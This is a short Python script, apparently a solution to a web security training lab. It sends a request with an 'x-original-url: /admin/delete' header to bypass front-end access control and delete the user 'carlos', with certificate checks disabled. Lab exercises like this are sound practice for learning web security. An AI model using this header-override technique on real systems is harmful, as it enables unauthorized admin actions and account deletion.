import http.client
import ssl
import urllib.parse

LAB_ID = "???"


def GET_admin_delete() -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = {
        'username': 'carlos'
    }
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'x-original-url': '/admin/delete',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


response = GET_admin_delete()
print(response.status)
for header, value in response.headers.items():
    print(f"{header}: {value}")
print(response.read().decode())
